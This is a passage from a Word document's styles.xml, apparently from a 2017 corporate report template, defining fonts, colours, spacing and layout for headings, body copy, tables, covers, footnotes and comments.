  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:next w:val="Bodycopy"/>
    <w:link w:val="Heading3Char"/>
    <w:qFormat/>
    <w:rsid w:val="00935C76"/>
    <w:pPr>
      <w:keepNext/>
      <w:spacing w:before="280"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
      <w:b/>
      <w:color w:val="000000"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading4">
    <w:name w:val="heading 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading4Char"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="008245A4"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="40"/>
      <w:outlineLvl w:val="3"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="B4101C" w:themeColor="accent1" w:themeShade="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading5">
    <w:name w:val="heading 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading5Char"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="004C1FB8"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="40"/>
      <w:outlineLvl w:val="4"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="B410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eastAsia="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
      <w:color w:val="231F20" w:themeColor="text1"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="ecxmsonormal">
    <w:name w:val="ecxmsonormal"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>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231F20" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Title">
    <w:name w:val="Title"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="TitleChar"/>
    <w:uiPriority w:val="10"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="8" w:space="4" w:color="EB1C2D" w:themeColor="accent1"/>
      </w:pBdr>
      <w:spacing w:after="300"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="B4101C" w:themeColor="text2" w:themeShade="BF"/>
      <w:spacing w:val="5"/>
      <w:kern w:val="28"/>
      <w:sz w:val="52"/>
      <w:szCs w:val="52"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TitleChar">
    <w:name w:val="Title Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Title"/>
    <w:uiPriority w:val="10"/>
    <w:semiHidden/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="B4101C" w:themeColor="text2" w:themeShade="BF"/>
      <w:spacing w:val="5"/>
      <w:kern w:val="28"/>
      <w:sz w:val="52"/>
      <w:szCs w:val="52"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Subtitle">
    <w:name w:val="Subtitle"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="SubtitleChar"/>
    <w:uiPriority w:val="11"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="1"/>
      </w:numPr>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="EB1C2D" w:themeColor="accent1"/>
      <w:spacing w:val="15"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="SubtitleChar">
    <w:name w:val="Subtitle Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Subtitle"/>
    <w:uiPriority w:val="11"/>
    <w:semiHidden/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="EB1C2D" w:themeColor="accent1"/>
      <w:spacing w:val="15"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="SubtleEmphasis">
    <w:name w:val="Subtle Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="19"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="97898C" w:themeColor="text1" w:themeTint="7F"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Emphasis">
    <w:name w:val="Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="20"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="IntenseEmphasis">
    <w:name w:val="Intense Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="21"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="EB1C2D" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Strong">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="22"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Quote">
    <w:name w:val="Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="QuoteChar"/>
    <w:uiPriority w:val="29"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="231F20" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QuoteChar">
    <w:name w:val="Quote Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Quote"/>
    <w:uiPriority w:val="29"/>
    <w:semiHidden/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="231F20" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="IntenseQuote">
    <w:name w:val="Intense Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="IntenseQuoteChar"/>
    <w:uiPriority w:val="30"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="4" w:space="4" w:color="EB1C2D" w:themeColor="accent1"/>
      </w:pBdr>
      <w:spacing w:before="200" w:after="280"/>
      <w:ind w:left="936" w:right="936"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="EB1C2D" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="IntenseQuoteChar">
    <w:name w:val="Intense Quote Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="IntenseQuote"/>
    <w:uiPriority w:val="30"/>
    <w:semiHidden/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="EB1C2D" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="SubtleReference">
    <w:name w:val="Subtle Reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="31"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rPr>
      <w:smallCaps/>
      <w:color w:val="656263" w:themeColor="accent2"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="IntenseReference">
    <w:name w:val="Intense Reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="32"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:color w:val="656263" w:themeColor="accent2"/>
      <w:spacing w:val="5"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="BookTitle">
    <w:name w:val="Book Title"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="33"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:spacing w:val="5"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NoSpacing">
    <w:name w:val="No Spacing"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="59"/>
    <w:rPr>
      <w:sz w:val="20"/>
    </w:rPr>
    <w:tblPr>
      <w:tblCellMar>
        <w:left w:w="0" w:type="dxa"/>
        <w:right w:w="0" w:type="dxa"/>
      </w:tblCellMar>
    </w:tblPr>
    <w:trPr>
      <w:cantSplit/>
    </w:trPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Bodycopy">
    <w:name w:val="Body copy"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00935C76"/>
    <w:pPr>
      <w:spacing w:after="280" w:line="340" w:lineRule="atLeast"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
      <w:color w:val="252525"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:jc w:val="right"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="78787A" w:themeColor="accent4"/>
      <w:sz w:val="14"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HeaderChar">
    <w:name w:val="Header Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Header"/>
    <w:uiPriority w:val="99"/>
    <w:rPr>
      <w:color w:val="78787A" w:themeColor="accent4"/>
      <w:sz w:val="14"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="right" w:pos="7646"/>
      </w:tabs>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="-2592"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:color w:val="78787A" w:themeColor="accent4"/>
      <w:sz w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FooterChar">
    <w:name w:val="Footer Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Footer"/>
    <w:uiPriority w:val="99"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
      <w:color w:val="78787A" w:themeColor="accent4"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Coverdate">
    <w:name w:val="Cover date"/>
    <w:uiPriority w:val="11"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial Narrow" w:eastAsia="Times New Roman" w:hAnsi="Arial Narrow" w:cs="Times New Roman"/>
      <w:color w:val="FFFFFF"/>
      <w:sz w:val="48"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CoverAgility2017">
    <w:name w:val="Cover Agility 2017"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:uiPriority w:val="10"/>
    <w:pPr>
      <w:spacing w:before="120"/>
      <w:ind w:left="432"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="EB1C2D" w:themeColor="text2"/>
      <w:sz w:val="34"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Covertitle">
    <w:name w:val="Cover title"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:uiPriority w:val="10"/>
    <w:pPr>
      <w:spacing w:before="480" w:after="600" w:line="600" w:lineRule="exact"/>
      <w:ind w:left="446" w:right="806"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
      <w:sz w:val="48"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Sidebarcopy">
    <w:name w:val="Sidebar copy"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:uiPriority w:val="7"/>
    <w:pPr>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:caps/>
      <w:color w:val="EB1C2D" w:themeColor="text2"/>
      <w:sz w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:next w:val="Bodycopy"/>
    <w:uiPriority w:val="39"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="right" w:pos="6912"/>
      </w:tabs>
      <w:spacing w:before="360" w:after="0" w:line="320" w:lineRule="exact"/>
      <w:ind w:right="1080"/>
    </w:pPr>
    <w:rPr>
      <w:noProof/>
      <w:color w:val="EB1C2D" w:themeColor="text2"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Coverpresentedby">
    <w:name w:val="Cover presented by"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:uiPriority w:val="11"/>
    <w:pPr>
      <w:spacing w:before="600" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="446"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading2"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="231F20" w:themeColor="text1"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading3"/>
    <w:rsid w:val="00935C76"/>
    <w:rPr>
      <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
      <w:b/>
      <w:color w:val="000000"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:next w:val="Bodycopy"/>
    <w:uiPriority w:val="39"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="right" w:pos="6912"/>
      </w:tabs>
      <w:spacing w:after="0" w:line="320" w:lineRule="exact"/>
      <w:ind w:right="1080"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="231F20" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="numbering" w:customStyle="1" w:styleId="XXXXXXXX">
    <w:name w:val="XXXXXXXX"/>
    <w:uiPriority w:val="99"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="2"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="Placeholder">
    <w:name w:val="Placeholder"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="99"/>
    <w:qFormat/>
    <w:rPr>
      <w:sz w:val="20"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRow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left w:w="115" w:type="dxa"/>
        <w:right w:w="115" w:type="dxa"/>
      </w:tblCellMar>
    </w:tblPr>
    <w:trPr>
      <w:cantSplit/>
    </w:trPr>
    <w:tcPr>
      <w:vAlign w:val="center"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:color w:val="FFFFFF" w:themeColor="background2"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="EB1C2D" w:themeFill="accent1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="BFBFBF" w:themeFill="accent3"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band2Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="D9D9D9" w:themeFill="background2" w:themeFillShade="D9"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Tablecopy">
    <w:name w:val="Table copy"/>
    <w:next w:val="TableGraphsource"/>
    <w:uiPriority w:val="7"/>
    <w:qFormat/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="288"/>
      </w:tabs>
      <w:spacing w:before="80" w:after="80"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
      <w:color w:val="656263" w:themeColor="accent2"/>
      <w:spacing w:val="-2"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TableGraphtitle">
    <w:name w:val="Table/Graph title"/>
    <w:basedOn w:val="Tablecopy"/>
    <w:next w:val="Tablecopy"/>
    <w:uiPriority w:val="4"/>
    <w:qFormat/>
    <w:pPr>
      <w:keepNext/>
      <w:spacing w:before="240"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:color w:val="EB1C2D" w:themeColor="text2"/>
      <w:sz w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TableGraphsource">
    <w:name w:val="Table/Graph source"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:next w:val="Bodycopy"/>
    <w:uiPriority w:val="5"/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:before="80" w:after="360" w:line="240" w:lineRule="exact"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="88888B"/>
      <w:sz w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Bullet1">
    <w:name w:val="Bullet 1"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:uiPriority w:val="2"/>
    <w:qFormat/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="10"/>
      </w:numPr>
      <w:spacing w:line="240" w:lineRule="exact"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Call-outQuote">
    <w:name w:val="Call-out/Quote"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:line="380" w:lineRule="exact"/>
      <w:ind w:left="101" w:hanging="101"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="numbering" w:customStyle="1" w:styleId="NumericList">
    <w:name w:val="Numeric List"/>
    <w:basedOn w:val="NoList"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="19"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Whatsinside">
    <w:name w:val="What's inside"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:uiPriority w:val="11"/>
    <w:qFormat/>
    <w:pPr>
      <w:pageBreakBefore/>
      <w:spacing w:after="1320"/>
      <w:ind w:left="-1800"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:color w:val="231F20"/>
      <w:spacing w:val="-10"/>
      <w:sz w:val="48"/>
    </w:rPr>
  </w:style>
  <w:style w:type="numbering" w:customStyle="1" w:styleId="StyleNumbered10ptText1Left015Hanging015">
    <w:name w:val="Style Numbered 10 pt Text 1 Left:  0.15&quot; Hanging:  0.15&quot;"/>
    <w:basedOn w:val="NoList"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="22"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="FootnoteText">
    <w:name w:val="footnote text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FootnoteTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rPr>
      <w:color w:val="656263" w:themeColor="accent2"/>
      <w:sz w:val="14"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FootnoteTextChar">
    <w:name w:val="Footnote Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="FootnoteText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rPr>
      <w:color w:val="656263" w:themeColor="accent2"/>
      <w:sz w:val="14"/>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customStyle="1" w:styleId="Code">
    <w:name w:val="Code"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:uiPriority w:val="3"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      <w:b/>
      <w:color w:val="231F20" w:themeColor="text1"/>
      <w:spacing w:val="40"/>
      <w:sz w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Note">
    <w:name w:val="Note:"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:next w:val="Bodycopy"/>
    <w:uiPriority w:val="2"/>
    <w:qFormat/>
    <w:pPr>
      <w:ind w:left="180"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Sidebarbold">
    <w:name w:val="Sidebar bold"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:next w:val="Sidebarcopy"/>
    <w:uiPriority w:val="7"/>
    <w:pPr>
      <w:spacing w:before="240" w:after="0" w:line="320" w:lineRule="atLeast"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:caps/>
      <w:color w:val="EB1C2D" w:themeColor="text2"/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Tablecolumnheading">
    <w:name w:val="Table column heading"/>
    <w:basedOn w:val="Tablecopy"/>
    <w:uiPriority w:val="7"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:caps/>
      <w:color w:val="FFFFFF" w:themeColor="background2"/>
    </w:r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URLonbackpage">
    <w:name w:val="URL on back page"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:uiPriority w:val="8"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
      <w:sz w:val="15"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Legalese">
    <w:name w:val="Legalese"/>
    <w:basedOn w:val="Bodycopy"/>
    <w:uiPriority w:val="8"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="160" w:lineRule="exact"/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
      <w:spacing w:val="2"/>
      <w:sz w:val="10"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Placeimage">
    <w:name w:val="Place image"/>
    <w:basedOn w:val="Tablecopy"/>
    <w:uiPriority w:val="5"/>
    <w:qFormat/>
    <w:rPr>
      <w:noProof/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="HdgnotinTOC">
    <w:name w:val="Hdg not in TOC"/>
    <w:uiPriority w:val="11"/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:before="480" w:after="280" w:line="360" w:lineRule="exact"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
      <w:color w:val="231F20" w:themeColor="text1"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TableGraphtitlenegativeindent">
    <w:name w:val="Table/Graph title (negative indent)"/>
    <w:basedOn w:val="TableGraphtitle"/>
    <w:uiPriority w:val="5"/>
    <w:pPr>
      <w:ind w:left="-2610"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TableGraphsourcenegativeindent">
    <w:name w:val="Table/Graph source (negative indent)"/>
    <w:basedOn w:val="TableGraphsource"/>
    <w:uiPriority w:val="6"/>
    <w:pPr>
      <w:ind w:left="-2700"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Placeimagenegativeindent">
    <w:name w:val="Place image (negative indent)"/>
    <w:basedOn w:val="Placeimage"/>
    <w:uiPriority w:val="6"/>
    <w:pPr>
      <w:ind w:left="-2610"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="CommentReference">
    <w:name w:val="annotation reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00240F5A"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentText">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="CommentTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00240F5A"/>
    <w:rPr>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentTextChar">
    <w:name w:val="Comment Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="CommentText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00240F5A"/>
    <w:rPr>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentSubject">
    <w:name w:val="annotation subject"/>
    <w:basedOn w:val="CommentText"/>
    <w:next w:val="CommentText"/>
    <w:link w:val="CommentSubjectChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00240F5A"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentSubjectChar">
    <w:name w:val="Comment Subject Char"/>
